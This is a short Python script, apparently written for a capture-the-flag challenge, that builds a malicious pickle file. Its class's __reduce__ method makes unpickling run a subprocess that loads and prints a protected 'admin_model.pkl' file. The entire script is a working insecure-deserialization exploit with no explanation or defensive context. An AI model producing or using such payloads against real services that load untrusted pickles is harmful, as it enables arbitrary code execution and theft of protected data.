import pickle
import subprocess

class ReadFlag2:
    def __reduce__(self):
        return (
            subprocess.check_output,
            (
                [
                    "python3",
                    "-c",
                    (
                        "import pickle;"
                        "f=open('models/admin_model.pkl','rb');"
                        "print(pickle.load(f))"
                    ),
                ],
            ),
        )

with open("read_flag2_from_model.pkl", "wb") as f:
    pickle.dump(ReadFlag2(), f)
